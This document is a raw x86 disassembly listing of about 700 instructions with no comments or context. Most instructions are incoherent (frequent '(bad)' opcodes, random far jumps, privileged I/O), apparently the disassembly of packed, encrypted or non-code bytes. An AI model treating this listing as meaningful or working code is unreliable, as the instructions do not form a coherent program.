  40d121:	cmp    BYTE PTR [edx+edi*4],cl
  40d124:	cmp    DWORD PTR [ebx+edx*2+0x74a99b58],ebx
  40d12b:	mov    esi,0xe386946e
  40d130:	rcr    BYTE PTR [edx+ecx*2-0x2d575075],cl
  40d137:	push   ecx
  40d138:	sbb    BYTE PTR [ebp+0x52],al
  40d13b:	hlt    
  40d13c:	push   0xd6476dbe
  40d141:	test   ebx,0xceaa81d7
  40d147:	jmp    0xfc20:0xd7313b06
  40d14e:	sub    edx,DWORD PTR [ecx+edx*8-0x3fa90fc6]
  40d155:	cld    
  40d156:	js     0x40d1d4
  40d158:	xor    eax,0xd3f45e58
  40d15d:	aam    0x3b
  40d15f:	sbb    BYTE PTR [ecx+ecx*2+0x28],0x50
  40d164:	in     eax,0xc
  40d166:	dec    edi
  40d167:	mov    ebp,0x832cf723
  40d16c:	dec    edx
  40d16d:	xor    ch,ch
  40d16f:	retf   0x49fe
  40d172:	push   ss
  40d173:	mov    esp,0xc9e86c63
  40d178:	and    eax,DWORD PTR [edi]
  40d17a:	lods   al,BYTE PTR ds:[esi]
  40d17b:	pop    ecx
  40d17c:	loopne 0x40d1fa
  40d17e:	fidivr WORD PTR [ebp+0x2d]
  40d181:	jecxz  0x40d1b8
  40d183:	sbb    eax,ecx
  40d185:	mov    ds:0x2d95964f,al
  40d18a:	int3   
  40d18b:	sbb    ah,BYTE PTR [eax+0x55]
  40d18e:	mov    bl,BYTE PTR [ebx+ecx*4]
  40d191:	out    0x48,al
  40d193:	stos   BYTE PTR es:[edi],al
  40d194:	in     al,dx
  40d195:	not    cl
  40d197:	outs   dx,DWORD PTR ds:[esi]
  40d198:	xchg   edi,eax
  40d199:	mov    dl,0x5b
  40d19b:	add    ah,BYTE PTR [ecx]
  40d19d:	scas   al,BYTE PTR es:[edi]
  40d19e:	inc    ecx
  40d19f:	mov    ah,BYTE PTR [ebx+ebp*4-0x7a727b1d]
  40d1a6:	ins    DWORD PTR es:[edi],dx
  40d1a7:	into   
  40d1a8:	and    ah,cl
  40d1aa:	mov    al,ds:0xd3e6d952
  40d1af:	push   0x74
  40d1b1:	xchg   edx,eax
  40d1b2:	retf   
  40d1b3:	fwait
  40d1b4:	adc    al,0x8d
  40d1b6:	sub    al,0xd4
  40d1b8:	nop
  40d1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ba:	mov    al,0x86
  40d1bc:	pop    es
  40d1bd:	jmp    0x2e23ece3
  40d1c2:	xchg   ebx,eax
  40d1c3:	ds (bad) 
  40d1c5:	fwait
  40d1c6:	mov    edx,0xaf280a9
  40d1cb:	xchg   ecx,eax
  40d1cc:	icebp  
  40d1cd:	adc    BYTE PTR [edi+0x77b6625f],cl
  40d1d3:	and    cl,BYTE PTR [ebp+edx*8+0x6e3c2b44]
  40d1da:	adc    eax,0xef845916
  40d1df:	shl    BYTE PTR [ecx-0x1fcfa2dc],cl
  40d1e5:	mov    esi,0xc968fed
  40d1ea:	ins    BYTE PTR es:[edi],dx
  40d1eb:	imul   esi,DWORD PTR [ecx-0x65],0x187f6ab
  40d1f2:	aam    0x34
  40d1f4:	mov    BYTE PTR [ebx],cl
  40d1f6:	or     al,0x92
  40d1f8:	out    0x31,eax
  40d1fa:	mov    esi,0xc144cab
  40d1ff:	ins    DWORD PTR es:[edi],dx
  40d200:	adc    dl,BYTE PTR [eax-0x28]
  40d203:	pop    esp
  40d204:	dec    ecx
  40d205:	arpl   WORD PTR [esi],ax
  40d207:	mov    al,0x99
  40d209:	lods   al,BYTE PTR ds:[esi]
  40d20a:	lds    esi,FWORD PTR [edx-0x5d14c5ac]
  40d210:	sbb    eax,0x8882984
  40d215:	mov    ebp,0x50b1019a
  40d21a:	bound  ebx,QWORD PTR [ebx]
  40d21c:	sbb    bh,0xd4
  40d21f:	loope  0x40d23c
  40d221:	div    BYTE PTR [edi+0x44]
  40d224:	jp     0x40d22e
  40d226:	xchg   edi,eax
  40d227:	push   esi
  40d228:	gs in  eax,dx
  40d22a:	mov    DWORD PTR [ebp+0x6288aab4],esp
  40d230:	or     DWORD PTR [esi],eax
  40d232:	xor    ch,al
  40d234:	xchg   esi,eax
  40d235:	in     al,dx
  40d236:	xchg   ebp,eax
  40d237:	jns    0x40d271
  40d239:	sub    eax,0xa9a259c8
  40d23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d23f:	jno    0x40d22a
  40d241:	hlt    
  40d242:	inc    esp
  40d243:	push   edi
  40d244:	test   al,0x77
  40d246:	or     esp,esp
  40d248:	and    eax,0x2c40e104
  40d24d:	repnz retf 
  40d24f:	pop    ebx
  40d250:	xchg   edi,eax
  40d251:	fidivr WORD PTR [edi-0x6a]
  40d254:	push   edx
  40d255:	test   eax,0x5ddd6a90
  40d25a:	jo     0x40d256
  40d25c:	or     DWORD PTR [esi-0x5d346e47],0x2e387f77
  40d266:	sbb    eax,0xd3b3d161
  40d26b:	nop
  40d26c:	cdq    
  40d26d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d26e:	outs   dx,DWORD PTR ds:[esi]
  40d26f:	fwait
  40d270:	cld    
  40d271:	shl    esi,1
  40d273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d274:	pop    edx
  40d275:	jmp    0x40d22c
  40d277:	pop    es
  40d278:	push   0x6d
  40d27a:	je     0x40d2a9
  40d27c:	and    eax,0x576c3e8a
  40d281:	clc    
  40d282:	mov    bh,0x9c
  40d284:	in     al,0xf8
  40d286:	in     al,0xba
  40d288:	xchg   esp,eax
  40d289:	daa    
  40d28a:	dec    esp
  40d28b:	sbb    DWORD PTR [ecx+ebp*4+0x76d608f8],ebp
  40d292:	dec    edi
  40d293:	test   DWORD PTR [edi-0x6d],ebp
  40d296:	push   es
  40d297:	xor    cl,dh
  40d299:	(bad)  
  40d29a:	outs   dx,WORD PTR ds:[esi]
  40d29c:	and    esi,DWORD PTR [esi+0x23]
  40d29f:	push   0xd2ffce8
  40d2a4:	jno    0x40d2d5
  40d2a6:	push   0xffffffae
  40d2a8:	shl    BYTE PTR [esi],0x67
  40d2ab:	out    dx,eax
  40d2ac:	fimul  WORD PTR [ecx-0x603c934d]
  40d2b2:	jge    0x40d2a6
  40d2b4:	scas   al,BYTE PTR es:[edi]
  40d2b5:	stc    
  40d2b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b7:	in     eax,dx
  40d2b8:	mov    WORD PTR [eax+0x6e],fs
  40d2bb:	push   0x1b
  40d2bd:	gs jle 0x40d303
  40d2c0:	imul   DWORD PTR [eax]
  40d2c2:	jno    0x40d32d
  40d2c4:	push   0xcd923ffc
  40d2c9:	scas   al,BYTE PTR es:[edi]
  40d2ca:	and    BYTE PTR [ebp+0x1c6ed6b8],ah
  40d2d0:	sbb    BYTE PTR [edi],al
  40d2d2:	fwait
  40d2d3:	dec    DWORD PTR [eax+eax*1]
  40d2d6:	mov    eax,0xcfc3bb9f
  40d2db:	ret    
  40d2dc:	xor    DWORD PTR [ebx-0x75],edi
  40d2df:	or     DWORD PTR [ebx],eax
  40d2e1:	push   ss
  40d2e2:	cmp    BYTE PTR cs:[ecx-0xe],0xb4
  40d2e7:	xor    al,0xc6
  40d2e9:	jmp    0x5277:0x26b41fa4
  40d2f0:	pop    eax
  40d2f1:	or     al,dl
  40d2f3:	xchg   esp,eax
  40d2f4:	je     0x40d349
  40d2f6:	ins    DWORD PTR es:[edi],dx
  40d2f7:	ret    0x1fe1
  40d2fa:	aam    0x6f
  40d2fc:	cmc    
  40d2fd:	mov    ds:0xf6b4df98,al
  40d302:	retf   
  40d303:	sbb    ebp,0xb315ce54
  40d309:	xchg   esi,eax
  40d30a:	cmp    al,0x71
  40d30c:	push   esi
  40d30d:	sbb    BYTE PTR [ebx+0x50],ah
  40d310:	xchg   edx,eax
  40d311:	inc    ebp
  40d312:	adc    eax,ebp
  40d314:	cmp    edx,0x12
  40d317:	into   
  40d318:	aas    
  40d319:	mov    dh,0x11
  40d31b:	dec    edx
  40d31c:	lds    esi,FWORD PTR [eax]
  40d31e:	xchg   ecx,eax
  40d31f:	repnz xchg esi,eax
  40d321:	shl    DWORD PTR [edi+0x47],0xe7
  40d325:	cmp    bl,BYTE PTR [edx]
  40d327:	enter  0xfc92,0x28
  40d32b:	retf   
  40d32c:	(bad)
  40d32f:	xchg   esp,eax
  40d330:	push   ebx
  40d331:	pop    ecx
  40d332:	stc    
  40d333:	sub    al,0xbd
  40d335:	jecxz  0x40d33d
  40d337:	fstp   TBYTE PTR [ecx-0xf3b948e]
  40d33d:	mov    ebx,0xa47a5e9c
  40d342:	es xchg esi,eax
  40d344:	mov    cs,eax
  40d346:	xchg   ch,ch
  40d348:	dec    eax
  40d349:	in     al,dx
  40d34a:	push   edi
  40d34b:	ss scas al,BYTE PTR es:[edi]
  40d34d:	retfw  
  40d34f:	ja     0x40d3b9
  40d351:	stos   DWORD PTR es:[edi],eax
  40d352:	xor    cl,BYTE PTR [eax-0x49]
  40d355:	jle    0x40d3b0
  40d357:	and    esi,DWORD PTR [ebp+0x54050f75]
  40d35d:	and    eax,0x9b6ad068
  40d362:	add    esi,DWORD PTR [edx]
  40d364:	and    al,0xa9
  40d366:	xor    al,0x63
  40d368:	hlt    
  40d369:	mov    bl,0xff
  40d36b:	test   al,0xbb
  40d36d:	vmwrite ebp,DWORD PTR es:[esi+0x758cede0]
  40d375:	xchg   esp,ebx
  40d377:	add    BYTE PTR [esi],al
  40d379:	jmp    0x40d346
  40d37b:	inc    ecx
  40d37c:	enter  0x65c9,0x5d
  40d380:	xor    DWORD PTR [eax+0x3f],ecx
  40d383:	sar    DWORD PTR [ebx+0x5cef9e20],1
  40d389:	push   es
  40d38a:	pop    ebp
  40d38b:	icebp  
  40d38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d38d:	mov    eax,0xe1edb14e
  40d392:	adc    ebp,esi
  40d394:	stos   BYTE PTR es:[edi],al
  40d395:	rol    DWORD PTR [ecx],1
  40d397:	mov    ds:0x451cdc85,eax
  40d39c:	ins    BYTE PTR es:[edi],dx
  40d39d:	xchg   esp,eax
  40d39e:	aaa    
  40d39f:	push   0x3dd61cf6
  40d3a4:	out    dx,al
  40d3a5:	xchg   ah,cl
  40d3a7:	in     eax,0x15
  40d3a9:	daa    
  40d3aa:	xor    ecx,DWORD PTR [ebp+esi*8-0x3eb28c10]
  40d3b1:	ficom  WORD PTR [ebp+edi*4+0x74]
  40d3b5:	rcr    esi,1
  40d3b7:	(bad)  
  40d3b8:	cmp    esi,ebp
  40d3ba:	in     eax,0x56
  40d3bc:	sbb    eax,0x223af117
  40d3c1:	inc    eax
  40d3c2:	retf   
  40d3c3:	dec    ebx
  40d3c4:	iret   
  40d3c5:	pop    ss
  40d3c6:	jmp    0x40d3e0
  40d3c8:	sahf   
  40d3c9:	mov    dh,0x9a
  40d3cb:	ret    0x2fac
  40d3ce:	sahf   
  40d3cf:	fldcw  WORD PTR [edx]
  40d3d1:	ror    DWORD PTR [ebx-0x5d],cl
  40d3d4:	or     al,0x8d
  40d3d6:	sbb    eax,DWORD PTR [ebp+0x79f41717]
  40d3dc:	fadd   st(7),st
  40d3de:	ds push es
  40d3e0:	fnsave [ebx-0x1b]
  40d3e3:	test   BYTE PTR [edx+0xc],dh
  40d3e6:	sub    ebx,ebp
  40d3e8:	shr    BYTE PTR ds:0xace117be,1
  40d3ee:	sub    eax,DWORD PTR [esi-0x20ba8cda]
  40d3f4:	mov    ds:0xf926b86a,al
  40d3f9:	clc    
  40d3fa:	xchg   ebx,eax
  40d3fb:	loope  0x40d400
  40d3fd:	mov    fs,eax
  40d3ff:	mov    ah,BYTE PTR [ebp+0x6b]
  40d402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d403:	sub    cl,bl
  40d405:	sti    
  40d406:	paddusw mm0,mm2
  40d409:	mov    ebx,0xa318ee52
  40d40e:	adc    ah,BYTE PTR [ebp+0x29832442]
  40d414:	and    eax,0x70bf4713
  40d419:	adc    ebp,DWORD PTR [edi]
  40d41b:	dec    esp
  40d41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41d:	fild   WORD PTR [edx+0xa]
  40d420:	jne    0x40d449
  40d422:	mov    ebp,0x5d059321
  40d427:	les    edx,FWORD PTR [edx-0x436c0053]
  40d42d:	lods   al,BYTE PTR ds:[esi]
  40d42e:	(bad)  
  40d42f:	loope  0x40d3bb
  40d431:	mov    BYTE PTR [esi+0x494cc09e],ch
  40d437:	sahf   
  40d438:	cmp    BYTE PTR [edx-0x7b],0x9f
  40d43c:	jg     0x40d487
  40d43e:	xchg   edx,eax
  40d43f:	sbb    BYTE PTR [ecx],dl
  40d441:	add    ah,al
  40d443:	cmp    DWORD PTR [eax+ebx*2+0x536b607e],eax
  40d44a:	sub    DWORD PTR ds:0xa18a32a9,edx
  40d450:	popa   
  40d451:	sbb    dl,BYTE PTR [edx-0x3912bf8f]
  40d457:	scas   al,BYTE PTR es:[edi]
  40d458:	out    0xea,eax
  40d45a:	stos   BYTE PTR es:[edi],al
  40d45b:	push   ebp
  40d45c:	(bad)  
  40d45d:	mov    al,0xf7
  40d45f:	ss sub eax,0x39bb75ab
  40d465:	test   BYTE PTR [edx-0xc],dh
  40d468:	fisubr DWORD PTR [eax]
  40d46a:	jne    0x40d452
  40d46c:	lods   al,BYTE PTR ds:[esi]
  40d46d:	fwait
  40d46e:	sbb    edi,eax
  40d470:	and    esp,DWORD PTR [esi+0x13]
  40d473:	aam    0xb
  40d475:	xchg   ebx,eax
  40d476:	mov    cl,0x22
  40d478:	lods   eax,DWORD PTR ds:[esi]
  40d479:	xchg   ecx,eax
  40d47a:	xor    ebx,DWORD PTR [esi+esi*2-0x8062264]
  40d481:	pusha  
  40d482:	gs pop edi
  40d484:	test   DWORD PTR ds:0x648aa222,0x7d7326e4
  40d48e:	mov    DWORD PTR [eax-0x34],0xb813f60e
  40d495:	cmp    ebp,DWORD PTR [edi+0x5e]
  40d498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d499:	(bad)  
  40d49a:	sbb    BYTE PTR [edx],bh
  40d49c:	retf   0x19f9
  40d49f:	out    dx,eax
  40d4a0:	int    0xdc
  40d4a2:	add    edi,DWORD PTR [edi+0x67197487]
  40d4a8:	inc    ecx
  40d4a9:	outs   dx,DWORD PTR ds:[esi]
  40d4aa:	push   esi
  40d4ab:	jae    0x40d4e6
  40d4ad:	mov    esp,0x218e6761
  40d4b2:	div    DWORD PTR [ebp-0x5d07a0f]
  40d4b8:	popf   
  40d4b9:	xchg   ebp,eax
  40d4ba:	popa   
  40d4bb:	jecxz  0x40d4c7
  40d4bd:	aas    
  40d4be:	fsubr  st,st(0)
  40d4c0:	and    esi,DWORD PTR [ebx+0x7a]
  40d4c3:	pop    ds
  40d4c4:	dec    edx
  40d4c5:	in     eax,0x28
  40d4c7:	aas    
  40d4c8:	mov    al,BYTE PTR [esi+0x3198ae14]
  40d4ce:	(bad)  
  40d4d0:	mov    WORD PTR [eax],cs
  40d4d2:	mov    WORD PTR [ecx-0x2e],ss
  40d4d5:	mov    dl,0x54
  40d4d7:	mov    al,0x7c
  40d4d9:	(bad)  
  40d4da:	fsub   DWORD PTR [eax]
  40d4dc:	stos   BYTE PTR es:[edi],al
  40d4dd:	inc    ecx
  40d4de:	dec    edx
  40d4df:	pop    esp
  40d4e0:	mov    esi,DWORD PTR [eax]
  40d4e2:	mov    ch,0x12
  40d4e4:	hlt    
  40d4e5:	push   eax
  40d4e6:	ds inc esi
  40d4e8:	sbb    al,0x77
  40d4ea:	pushw  ss
  40d4ec:	mov    ds,WORD PTR [edi]
  40d4ee:	ss push edx
  40d4f0:	inc    ebx
  40d4f1:	sbb    al,0xcc
  40d4f3:	outs   dx,DWORD PTR ds:[esi]
  40d4f4:	adc    eax,0x8928249d
  40d4f9:	lods   al,BYTE PTR ds:[esi]
  40d4fa:	hlt    
  40d4fb:	scas   eax,DWORD PTR es:[edi]
  40d4fc:	push   ebp
  40d4fd:	cld    
  40d4fe:	and    ebp,DWORD PTR [esi]
  40d500:	daa    
  40d501:	jo     0x40d550
  40d503:	sbb    BYTE PTR [edi+0x2b],dl
  40d506:	push   esi
  40d507:	cmc    
  40d508:	shr    DWORD PTR [edx-0x403e2098],1
  40d50e:	lea    ecx,[eax+0x5]
  40d511:	jne    0x40d591
  40d513:	repz imul eax,DWORD PTR [edi+0x7511366c],0xffffffbd
  40d51b:	fldcw  WORD PTR [ebp+0x40]
  40d51e:	inc    edx
  40d51f:	cmp    edi,DWORD PTR [edi+eax*8+0x78]
  40d523:	mov    bl,0xb2
  40d525:	mov    edi,0x4a844160
  40d52a:	cdq    
  40d52b:	(bad)  
  40d52c:	sbb    eax,0x99ff9f21
  40d531:	pop    esi
  40d532:	(bad)  
  40d533:	ds ins BYTE PTR es:[edi],dx
  40d535:	loop   0x40d53e
  40d537:	gs pop ds
  40d539:	dec    eax
  40d53a:	ins    DWORD PTR es:[edi],dx
  40d53b:	ja     0x40d584
  40d53d:	and    bh,dh
  40d53f:	cs add al,0x6d
  40d542:	and    ch,al
  40d544:	dec    ecx
  40d545:	mov    eax,ds:0xa2644e21
  40d54a:	aam    0x3c
  40d54c:	xor    BYTE PTR [ebp+0xed9adaf],bh
  40d552:	dec    edi
  40d553:	data16 ins BYTE PTR es:[edi],dx
  40d555:	mov    eax,ds:0xd405e77
  40d55a:	sbb    ebx,DWORD PTR [eax+0x22]
  40d55d:	sub    eax,0xec85e42c
  40d562:	call   0x43bb:0x582ca11a
  40d569:	aam    0xb0
  40d56b:	sub    ecx,esi
  40d56d:	sub    al,0x85
  40d56f:	inc    edx
  40d570:	imul   edi,DWORD PTR [ebp-0x236f288],0x94d92083
  40d57a:	push   ds
  40d57b:	jecxz  0x40d53e
  40d57d:	repnz inc ebx
  40d57f:	add    cl,bh
  40d581:	repnz fs cmp eax,0x5c0e6ace
  40d588:	leave  
  40d589:	jecxz  0x40d5f4
  40d58b:	int    0xab
  40d58d:	and    BYTE PTR cs:[edi-0x55],dl
  40d591:	imul   BYTE PTR [esi]
  40d593:	fdiv   QWORD PTR [edx+0x7b77a632]
  40d599:	fs jns 0x40d58e
  40d59c:	jbe    0x40d608
  40d59e:	lds    ebx,FWORD PTR [edx-0x4a4439a8]
  40d5a4:	sbb    DWORD PTR [edx],eax
  40d5a6:	jl     0x40d53e
  40d5a8:	mul    BYTE PTR [eax+0x59]
  40d5ab:	mov    eax,0x80b2f944
  40d5b0:	pop    ebx
  40d5b1:	jae    0x40d5f4
  40d5b3:	jg     0x40d583
  40d5b5:	mov    DWORD PTR [eax],edi
  40d5b7:	fistp  DWORD PTR [edx]
  40d5b9:	sbb    al,dh
  40d5bb:	xchg   ecx,eax
  40d5bc:	inc    esi
  40d5bd:	js     0x40d5d5
  40d5bf:	jge    0x40d61d
  40d5c1:	sub    ebp,eax
  40d5c3:	or     BYTE PTR [ebx+0x294dd184],al
  40d5c9:	jb     0x40d600
  40d5cb:	inc    esp
  40d5cc:	ins    BYTE PTR es:[edi],dx
  40d5cd:	mov    dl,0xc4
  40d5cf:	xchg   ecx,eax
  40d5d0:	xor    eax,0x18164ac3
  40d5d5:	xor    ch,bh
  40d5d7:	xchg   esi,eax
  40d5d8:	add    al,0x7a
  40d5da:	xchg   DWORD PTR [edi+ebp*8+0x6d4ff41b],eax
  40d5e1:	bound  ecx,QWORD PTR [eax+0x20a02365]
  40d5e7:	mov    al,bl
  40d5e9:	out    0x2a,eax
  40d5eb:	adc    eax,DWORD PTR [ebx+0x20]
  40d5ee:	adc    BYTE PTR [esp+ebx*1-0x2fcf2789],dl
  40d5f5:	sbb    eax,0xb31ef1bf
  40d5fa:	jle    0x40d642
  40d5fc:	cmp    eax,0x3b558843
  40d601:	dec    ebx
  40d602:	cld    
  40d603:	clc    
  40d604:	dec    edi
  40d605:	test   eax,0x6a05f6ae
  40d60a:	stos   BYTE PTR es:[edi],al
  40d60b:	std    
  40d60c:	push   ds
  40d60d:	sti    
  40d60e:	mov    ds:0xdd7366ac,al
  40d613:	scas   eax,DWORD PTR es:[edi]
  40d614:	pop    ecx
  40d615:	mov    ebx,0x3b8b1736
  40d61a:	push   esi
  40d61b:	mov    al,0x35
  40d61d:	shl    DWORD PTR [edi],cl
  40d61f:	test   eax,0xbeeb84e5
  40d624:	xor    eax,0x6cbae790
  40d629:	xchg   ebp,eax
  40d62a:	pop    ebp
  40d62b:	mul    BYTE PTR [esi]
  40d62d:	pop    esi
  40d62e:	mov    eax,ds:0xa8fbfce1
  40d633:	pop    ebp
  40d634:	xchg   ebp,eax
  40d635:	int3   
  40d636:	mov    dl,0x93
  40d638:	iret   
  40d639:	push   ecx
  40d63a:	dec    ebx
  40d63b:	xor    al,0xea
  40d63d:	jmp    0x7c7a:0x93a99a38
  40d644:	cmp    al,0x76
  40d646:	sub    edx,ecx
  40d648:	inc    ebx
  40d649:	ja     0x40d643
  40d64b:	div    BYTE PTR [ecx+esi*1+0x53]
  40d64f:	inc    edi
  40d650:	call   0x730ead19
  40d655:	dec    ecx
  40d656:	xchg   edx,eax
  40d657:	xchg   ebp,eax
  40d658:	push   esi
  40d659:	mov    edi,0xd979b9a5
  40d65e:	or     DWORD PTR [ebp+esi*1+0x42],ebx
  40d662:	jle    0x40d60a
  40d664:	jle    0x40d6b8
  40d666:	iret   
  40d667:	imul   esp,edx,0xffffffe0
  40d66a:	inc    edi
  40d66b:	(bad)  
  40d66c:	loop   0x40d642
  40d66e:	sti    
  40d66f:	jmp    0x40d6a6
  40d671:	es leave 
  40d673:	mov    DWORD PTR [edx+0x28],eax
  40d676:	(bad)  
  40d677:	push   ebx
  40d678:	add    DWORD PTR [ebp+0x2c],ebp
  40d67b:	cdq    
  40d67c:	inc    ebp
  40d67d:	xchg   esp,eax
  40d67e:	mov    bl,dl
  40d680:	ja     0x40d6aa
  40d682:	cmp    al,BYTE PTR ds:0x481e6570
  40d688:	(bad)  [edx]
  40d68a:	cmp    esp,DWORD PTR [ebp+0x2b]
  40d68d:	mov    cl,0xdd
  40d68f:	and    bl,dh
  40d691:	xchg   BYTE PTR [edx-0x30],dl
  40d694:	mov    edi,0xc2b6f839
  40d699:	fmul   QWORD PTR [ebx-0x3]
  40d69c:	mov    esi,0x515094f9
  40d6a1:	xchg   ah,dh
  40d6a3:	mov    cl,0xe6
  40d6a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6a6:	push   ebx
  40d6a7:	ins    DWORD PTR es:[edi],dx
  40d6a8:	pop    ecx
  40d6a9:	cld    
  40d6aa:	nop
  40d6ab:	fnop   
  40d6ad:	ret    0x74e0
  40d6b0:	pop    ds
  40d6b1:	cmp    esp,DWORD PTR [eax+0x10db006f]
  40d6b7:	and    DWORD PTR [edi],eax
  40d6b9:	daa    
  40d6ba:	jmp    0xf51ed7bf
  40d6bf:	dec    edx
  40d6c0:	fcom   st(5)
  40d6c2:	sub    edi,esi
  40d6c4:	push   edi
  40d6c5:	shr    DWORD PTR [edi],cl
  40d6c7:	xchg   eax,ebx
  40d6c9:	inc    edx
  40d6ca:	nop
  40d6cb:	ret    
  40d6cc:	(bad)  
  40d6cd:	cld    
  40d6ce:	add    BYTE PTR [edx],dl
  40d6d0:	retf   
  40d6d1:	mov    bl,0xec
  40d6d3:	jae    0x40d6a1
  40d6d5:	or     esi,DWORD PTR [esi+0x5573a236]
  40d6db:	(bad)  
  40d6dc:	sbb    eax,0xcfc6be69
  40d6e1:	inc    ecx
  40d6e2:	dec    edi
  40d6e3:	in     al,dx
  40d6e4:	adc    edx,DWORD PTR [ebx]
  40d6e6:	cmp    eax,0x807b4843
  40d6eb:	cmp    eax,0x544b591d
  40d6f0:	or     eax,DWORD PTR [ecx+0x5b6a9a7]
  40d6f6:	ficom  WORD PTR [ebx+0x45]
  40d6f9:	mov    WORD PTR [ebx-0x67],es
  40d6fc:	cmp    BYTE PTR [eax-0x19],0xa5
  40d700:	xchg   esp,eax
  40d701:	and    BYTE PTR [edx-0x104e8d3a],0x9d
  40d708:	ja     0x40d6c3
  40d70a:	jne    0x40d6aa
  40d70c:	loop   0x40d71b
  40d70e:	xchg   ecx,eax
  40d70f:	push   edx
  40d710:	mov    WORD PTR [eax+0x33bd4cc0],ds
  40d716:	jbe    0x40d6aa
  40d718:	test   DWORD PTR [esp+eiz*4],esp
  40d71b:	pusha  
  40d71c:	adc    BYTE PTR [esi],dl
  40d71e:	lds    ebp,FWORD PTR [ebp+0x8]
  40d721:	gs and al,0xeb
  40d724:	sbb    edi,DWORD PTR [ebx+ebx*4-0x1b]
  40d728:	addr16 mov esp,0xf6df32a4
  40d72e:	mov    ds,WORD PTR ds:0x736efabe
  40d734:	cmp    DWORD PTR [ecx],ebx
  40d736:	xor    esi,DWORD PTR [ebp+ecx*1+0x3c96e7e0]
  40d73d:	movd   DWORD PTR [ecx+0x6b4e8266],mm3
  40d744:	loop   0x40d6fa
  40d746:	adc    al,0x62
  40d748:	repnz sbb DWORD PTR [ebx+0x63],esi
  40d74c:	rcr    BYTE PTR [edi],0xd6
  40d74f:	mov    esi,0x40a4cc1e
  40d754:	scas   al,BYTE PTR es:[edi]
  40d755:	lods   al,BYTE PTR ds:[esi]
  40d756:	push   es
  40d757:	iret   
  40d758:	mov    al,0xe5
  40d75a:	jns    0x40d7cd
  40d75c:	retf   0x8677
  40d75f:	out    0x59,eax
  40d761:	push   esp
  40d762:	stos   DWORD PTR es:[edi],eax
  40d763:	aaa    
  40d764:	rcr    BYTE PTR [edx-0x7a987c67],1
  40d76a:	lds    esp,FWORD PTR [edx-0x299bf29f]
  40d770:	bound  eax,QWORD PTR ss:[esi]
  40d773:	inc    esp
  40d774:	jb     0x40d7c5
  40d776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d777:	dec    esi
  40d778:	xchg   BYTE PTR [esi+0x43],ah
  40d77b:	dec    edi
  40d77c:	push   ebx
  40d77d:	into   
  40d77e:	fstp   DWORD PTR [ebx+0x3a]
  40d781:	idiv   ebp
  40d783:	enter  0xe642,0x87
  40d787:	adc    ch,BYTE PTR [esi-0x6f]
  40d78a:	mov    eax,ds:0x8db1a479
  40d78f:	or     dl,al
  40d791:	mov    dl,BYTE PTR [edi-0x72]
  40d794:	jnp    0x40d7f9
  40d796:	mov    al,0x5
  40d798:	adc    DWORD PTR [eax],edx
  40d79a:	sbb    al,0x30
  40d79c:	mov    edi,0x7c53759c
  40d7a1:	scas   eax,DWORD PTR es:[edi]
  40d7a2:	(bad)  
  40d7a3:	and    esp,DWORD PTR [ecx+0x3a621929]
  40d7a9:	cmp    eax,0xbaa4cf42
  40d7ae:	mov    al,ds:0xc8e6215c
  40d7b3:	test   al,0xb6
  40d7b5:	rep outs dx,BYTE PTR ds:[esi]
  40d7b7:	out    dx,al
  40d7b8:	jle    0x40d784
  40d7ba:	and    al,0xba
  40d7bc:	inc    ch
  40d7be:	sub    dh,BYTE PTR [esi+0x17]
  40d7c1:	xor    ecx,DWORD PTR [esi]
  40d7c3:	and    ch,BYTE PTR [ecx-0x51]
  40d7c6:	stos   BYTE PTR es:[edi],al
  40d7c7:	push   eax
  40d7c8:	xchg   ecx,eax
  40d7c9:	fdiv   st,st(1)
  40d7cb:	ret    
  40d7cc:	xchg   ecx,eax
  40d7cd:	mov    ecx,0x1b40a1e5
  40d7d2:	out    dx,al
  40d7d3:	add    eax,0xdce2d0ea
  40d7d8:	les    edx,FWORD PTR cs:[edx-0x7e904951]
  40d7df:	jecxz  0x40d7f9
  40d7e1:	inc    edi
  40d7e2:	(bad)  [esi+edx*1+0x42]
  40d7e6:	add    BYTE PTR [ecx],0x5e
  40d7e9:	xchg   BYTE PTR [ecx-0x32],dh
  40d7ec:	(bad)  
  40d7ed:	xor    DWORD PTR [edi+0x26fcc972],eax
  40d7f3:	loope  0x40d808
  40d7f5:	mov    eax,0xa19d43fb
  40d7fa:	pop    es
  40d7fb:	mov    ds:0x23bb1242,eax
  40d800:	loop   0x40d880
  40d802:	enter  0x4834,0xd
  40d806:	cvtdq2ps xmm3,XMMWORD PTR [ebp-0x4d4b111d]
  40d80d:	xchg   edi,eax
  40d80e:	push   ebx
  40d80f:	out    0x30,al
  40d811:	inc    esi
  40d812:	repz or eax,0x29460a6c
  40d818:	aam    0x7
  40d81a:	aad    0x7e
  40d81c:	or     bl,BYTE PTR [bx-0x2db]
  40d821:	jne    0x40d83a
  40d823:	lea    esp,es:[edi-0xe]
  40d827:	iret   
  40d828:	sahf   
  40d829:	xchg   ebp,eax
  40d82a:	fsub   QWORD PTR [ebx-0x3c07b26d]
  40d830:	add    edx,eax
  40d832:	jp     0x40d888
  40d834:	jo     0x40d877
  40d836:	out    dx,eax
  40d837:	fwait
  40d838:	daa    
  40d839:	xchg   ebp,eax
  40d83a:	push   ecx
  40d83b:	add    ebp,DWORD PTR [ecx+0x73]
  40d83e:	xor    ebx,eax
  40d840:	mov    dh,0xff
  40d842:	mov    ecx,edx
  40d844:	dec    ebp
  40d845:	adc    bl,bl
  40d847:	ins    BYTE PTR es:[edi],dx
  40d848:	sbb    eax,0x4e660761
  40d84d:	int3   
  40d84e:	jge    0x40d805
  40d850:	inc    eax
  40d851:	clc    
  40d852:	in     eax,0xe7
  40d854:	push   ebp
  40d855:	or     dl,BYTE PTR [ecx+eiz*4]
  40d858:	adc    bl,0xa
  40d85b:	xchg   edi,eax
  40d85c:	dec    esp
  40d85d:	clc    
  40d85e:	outs   dx,DWORD PTR ds:[esi]
  40d85f:	mov    ds:0x181016bf,eax
  40d864:	jmp    0xa967bfb9
